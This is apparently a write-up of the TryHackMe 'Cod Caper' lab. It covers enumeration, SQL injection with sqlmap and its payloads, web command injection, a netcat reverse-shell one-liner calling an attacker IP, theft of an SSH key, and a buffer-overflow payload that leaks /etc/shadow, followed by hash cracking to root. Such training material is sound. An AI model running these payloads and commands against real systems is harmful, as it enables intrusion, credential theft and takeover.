# The Cod Caper Walkthrough
## Intro
Welcome to the The Cod Caper challenge, here is the link to the [room](https://tryhackme.com/room/thecodcaper) on TryHackMe. <br>
This is an easy semi-guided room about web enumeration/exploitation and finally privesc via binary exploitation.

### Scenario
Hello there my name is Pingu. I've come here to put in a request to get my fish back! My dad recently banned me from eating fish, as I wasn't eating my vegetables. He locked all the fish in a chest, and hid the key on my old pc, that he recently repurposed into a server. As all penguins are natural experts in penetration testing, I figured I could get the key myself! Unfortunately he banned every IP from Antarctica, so I am unable to do anything to the server. Therefore I call upon you my dear ally to help me get my fish back! Naturally I'll be guiding you through the process.

<br/>

Whenever you feel ready press on "Start Machine" and connect via OpenVPN or by using the AttackBox.
Let's begin!

<br/>
<br/>

## The Challenge
We can start with a port scan:
```bash
rustscan -a 10.81.162.240 -r 0-65535  --ulimit 5000 -- -sV -sC
```

It finds the usual 2 ports open: 22 for SSH and 80 for web:
```
PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 6d:2c:40:1b:6c:15:7c:fc:bf:9b:55:22:61:2a:56:fc (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDs2k31WKwi9eUwlvpMuWNMzFjChpDu4IcM3k6VLyq3IEnYuZl2lL/dMWVGCKPfnJ1yv2IZVk1KXha7nSIR4yxExRDx7Ybi7ryLUP/XTrLtBwdtJZB7k48EuS8okvYLk4ppG1MRvrVojNPprF4nh5S0EEOowqGoiHUnGWOzYSgvaLAgvr7ivZxSsFCLqvdmieErVrczCBOqDOcPH9ZD/q6WalyHMccZWVL3Gk5NmHPaYDd9ozVHCMHLq7brYxKrUcoOtDhX7btNamf+PxdH5I9opt6aLCjTTLsBPO2v5qZYPm1Rod64nysurgnEKe+e4ZNbsCvTc1AaYKVC+oguSNmT
|   256 ff:89:32:98:f4:77:9c:09:39:f5:af:4a:4f:08:d6:f5 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBAmpmAEGyFxyUqlKmlCnCeQW4KXOpnSG6SwmjD5tGSoYaz5Fh1SFMNP0/KNZUStQK9KJmz1vLeKI03nLjIR1sho=
|   256 89:92:63:e7:1d:2b:3a:af:6c:f9:39:56:5b:55:7e:f9 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFBIRpiANvrp1KboZ6vAeOeYL68yOjT0wbxgiavv10kC
80/tcp open  http    syn-ack Apache httpd 2.4.18 ((Ubuntu))
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Let's take a look at the website at `http://MACHINE_IP` -> contains the generic Apache 2 page.
In the meantime we start a directory scan of it in the background:
```bash
gobuster dir -u http://10.81.162.240/  -w /usr/share/SecLists/Discovery/Web-Content/big.txt -x php,txt,html
```

After a while it finds this file ==`/adm..REDACTED`==, if we navigate there we find a bare-bone login page.
There is an issue, at the moment we do not have any credentials.. yet.

The task suggests us to use *sqlmap* to automate the SQL Injection testing.
We can run it with a few simple parameters like this:
```bash
sqlmap -u http://10.81.162.240/adm...REDACTED --form -a
```

This will work interactively, we will be prompted if take any actions on a specific element or path.
Testing the form it finds that the back-end is using MySQL, this means that we could force this in the previous command with `--dbms=mysql`.

After a while we can confirm the SQLi vulnerability to 3 types of it and we get the credentials to log in:
```
Parameter: username (POST)
    Type: boolean-based blind
    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
    Payload: username=bpbT' RLIKE (SELECT (CASE WHEN (1039=1039) THEN 0x62706254 ELSE 0x28 END))-- IqaQ&password=cRoS

    Type: error-based
    Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
    Payload: username=bpbT' AND GTID_SUBSET(CONCAT(0x7162787871,(SELECT (ELT(3466=3466,1))),0x71717a7071),3466)-- nlyu&password=cRoS

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: username=bpbT' AND (SELECT 8498 FROM (SELECT(SLEEP(5)))eoEt)-- JNoh&password=cRoS
```

```
database management system users [4]:
[*] 'debian-sys-maint'@'localhost'
[*] 'mysql.session'@'localhost'
[*] 'mysql.sys'@'localhost'
[*] 'root'@'localhost'

[20:33:47] [INFO] fetching database users password hashes
[20:33:47] [INFO] retrieved: 'debian-sys-maint'
[20:33:47] [INFO] retrieved: '*81F5E21E35407D884A6CD4A731AEBFB6AF209E1B'
[20:33:47] [INFO] retrieved: 'mysql.session'
[20:33:48] [INFO] retrieved: '*THISISNOTAVALIDPASSWORDTHATCANBEUSEDHERE'
[20:33:48] [INFO] retrieved: 'mysql.sys'
[20:33:48] [INFO] retrieved: '*THISISNOTAVALIDPASSWORDTHATCANBEUSEDHERE'
[20:33:48] [INFO] retrieved: 'root'
[20:33:48] [INFO] retrieved: '*82D1BDA2F1E16E0DAEE2412F1C6E8DE7DF8B84FD'
```

```
+------------+----------+
| password   | username |
+------------+----------+
| REDACTED   | REDACTED |
+------------+----------+
```

--> REDACTED

Now we can go back to the login form and submit them and reach this page: `http://10.81.162.240/2591c98b70119...REDACTED`.
Here we can see another form where we can insert a command, it accepts any usual command you would run on your Linux based system, in fact if we submit `whoami` we get "www-data".

We can list the current directory with `ls` and find REDACTED files.
Also reading the passwd file we can see a user called "pingu".

We can take advantage of this "feature" to get a shell into the system.
Let's prepare a listener on our machine:
```bash
nc -lvnp 1234
```

Now into the website let's send the reverse shell:
```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc YOUR_IP 1234 >/tmp/f
```

This will spawn the shell we wanted, let's make it more stable and fully interactive. If you don't know how i made a full guide [here](https://github.com/Maat-Cyber/Maat-Cyber-World/blob/998200255c91249aad8e1f2183c79847f3c6bcc7/Tips-%26-Resources/Reverse_Shell-Upgrade.md)

<br/>

### Privilege Escalation

#### Becoming Pingu
Now the tak suggests us to transfer LinPeas utility to enumerate the target but i already know where i want to go.
Based on the info we got so far: an user named Pingu and port 22 open really screams at me to try and get the user SSH key. This way we get 2 in 1, we get a super stable and reusable connection via SSH and also move from a web-user to Pingu, who might has higher privileges on the system.
So i opened the `id_rsa` at:
```bash
cat /home/pingu/.ssh/id_rsa
```

```
-----BEGIN RSA PRIVATE KEY-----
MIIEogIBAAKCAQEArfwVtcBusqBrJ02SfHLEcpbFcrxUVFezLYEUUFTHRnTwUnsU
aHa3onWWNQKVoOwtr3iaqsandQoNDAaUNocbxnNoJaIAg40G2FEI49wW1Xc9porU
x8haIBCI3LSjBd7GDhyh4T6+o5K8jDfXmNElyp7d5CqPRQHNcSi8lw9pvFqaxUuB
ZYD7XeIR8i08IdivdH2hHaFR32u3hWqcQNWpmyYx4JhdYRdgdlc6U02ahCYhyvYe
LKIgaqWxUjkOOXRyTBXen/A+J9cnwuM3Njx+QhDo6sV7PDBIMx+4SBZ2nKHKFjzY
y2RxhNkZGvL0N14g3udz/qLQFWPICOw218ybaQIDAQABAoIBAClvd9wpUDPKcLqT
hueMjaycq7l/kLXljQ6xRx06k5r8DqAWH+4hF+rhBjzpuKjylo7LskoptYfyNNlA
V9wEoWDJ62vLAURTOeYapntd1zJPi6c2OSa7WHt6dJ3bh1fGjnSd7Q+v2ccrEyxx
wC7s4Is4+q90U1qj60Gf6gov6YapyLHM/yolmZlXunwI3dasEh0uWFd91pAkVwTb
FtzCVthL+KXhB0PSQZQJlkxaOGQ7CDT+bAE43g/Yzl309UQSRLGRxIcEBHRZhTRS
M+jykCBRDJaYmu+hRAuowjRfBYg2xqvAZU9W8ZIkfNjoVE2i+KwVwxITjFZkkqMI
jgL0oAECgYEA3339Ynxj2SE5OfD4JRfCRHpeQOjVzm+6/8IWwHJXr7wl/j49s/Yw
3iemlwJA7XwtDVwxkxvsfHjJ0KvTrh+mjIyfhbyj9HjUCw+E3WZkUMhqefyBJD1v
tTxWWgw3DKaXHqePmu+srUGiVRIua4opyWxuOv0j0g3G17HhlYKL94ECgYEAx0qf
ltrdTUrwr8qRLAqUw8n1jxXbr0uPAmeS6XSXHDTE4It+yu3T606jWNIGblX9Vk1U
mc .... REDACTED....
-----END RSA PRIVATE KEY-----
```

We copy it over on our machine and name it the same, also we need to set the right permissions:
```bash
chmod 600 id_rsa
```

Then SSH in:
```bash
 ssh -i id_rsa pingu@10.81.162.240
```

There is an issue, the key authentication fails and it still asks us for a password.

Another common path is to check in system wide directories such as `/opt` `/var`, running:
```bash
ls -la /var
```

We find a directory called `hidden` with inside a file called `pass`:
```bash
cat /var/hidden/pass
```
--> REDACTED

Running LinPeas would have probably highlighted this file in the report because of its name, anyway with the password we can complete our SSH login.

<br>

#### Becoming Papa
Now that we are pingu we can see another user in `/home` called "papa" our next move is to switch to that user.

Reading task 7 we replicate with:
```bash
gdb /opt/secret/root
```
then type `r < <(cyclic 50)`, that command runs the program and provides 50 characters worth of "cyclic" input.

Running `cyclic -l 0x6161616c` outputs 44, meaning we can overwrite EIP once we provide 44 characters of input.
Something we can also find in the pingu's file:
```bash
cat ~/.gdb_history
```

```
r < <(python -c 'print "A"*44 + "\xcb\x84\x04\x08"')
r < <(python -c 'print "A"*44 + "\xcb\x84\x04\x08"')
r < <(python -c 'print "A"*44 + "\xcb\x84\x04\x08"')
exit
uqit
quit
r < <(python -c 'print "A"*44 + "\xcb\x84\x04\08")
r < <(python -c 'print "A"*44 + "\xcb\x84\x04\08"')
r < <(python -c 'print "A"*44 + "\xcb\x84\x04\x08"')
r < <(python -c 'print "A"*44 + "\xcb\x84\x04\x08"')
r < <(python -c 'print "A"*44 + "\xcb\x84\x04\x08"')
exit
ls
quit
r < <(python -c 'print "A"*44 + "\xcb\x84\x04\x08")
r < <(python -c 'print "A"*44 + "\xcb\x84\x04\x08"')
r < <(python -c 'print "A"*44 + "\xcb\x84\x04\x08")
r < <(python -c 'print "A"*44 + "\xcb\x84\x04\x08"')
r < <(python -c 'print "A"*44 + "\xcb\x84\x04\x08"')
r < <(python -c 'print "A"*44 + "\xcb\x84\x04\x08"')
r < <(python -c 'print "A"*44 + "\xcb\x84\x04\x08"')
r < <(python -c 'print "A"*44 + "\xcb\x84\x04\x08"')
whoami
r < <(python -c 'print "A"*44 + "\xcb\x84\x04\x08"')
r < <(python -c 'print "A"*44 + "\xcb\x84\x04\x08"')
r < <(python -c 'print "A"*44 + "\xcb\x84\x04\x08"')
r < <(python -c 'print "A"*44 + "\xcb\x84\x04\x08"')
r < <(python -c 'print "A"*44 + "\xcb\x84\x04\x08"')
r < <(python -c 'print "A"*44 + "\xcb\x84\x04\x08"')
r < <(python -c 'print "A"*44 + "\xcb\x84\x04\x08"')
r < <(python -c 'print "A"*44 + "\xcb\x84\x04\x08"')
r < <(python -c 'print "A"*44 + "\xcb\x84\x04\x08"')
r < <(python -c 'print "A"*44 + "\xcb\x84\x04\x08"')
r < <(python -c 'print "A"*44 + "\xcb\x84\x04\x08"')
```

Moving to exploitation we are told:
"We print 44 random characters(in this case A) and then our memory address in little endian, and shell should execute. This can be tested by piping the output in to the binary "
```bash
python -c 'print "A"*44 + "\xcb\x84\x04\x08"' | /opt/secret/root
```

This shows what it appears to be the content of the `/etc/shadow` file, with the root and papa password hashes.
```
root:$6$rFK4s/vE$zkh2/RBiRZ746OW3/Q/zqTRVfrfYJfFjFc2/q.REDACTED.:18277:0:99999:7:::
papa:$1$ORU43el1$tgY7epqx64...REDACTED.:18277:0:99999:7:::
```

This means that we can now use *Hashcat* to crack them, we can go directly to the root one:
- save the hash in a file called `hash`, then:
```bash
 hashcat -a 0 -m 1800 hash --wordlist /usr/share/SecLists/rockyou.txt
```

Wait for a little bit and you should get the password:
--> REDACTED

Finally we can switch to the root user:
```bash
su root
```

And this ends today's challenge, there appears to be no other flags around to catch.

<br/>
<br/>

Congratulations, you have successfully uploaded the revese shell via a vulnerablility in the web-service and gained acccess to the machine, to finally escalate your privileges by xploiting a binary.

Hope you had fun following along and completing the challenge.

Catch you in the next CTF 😃 
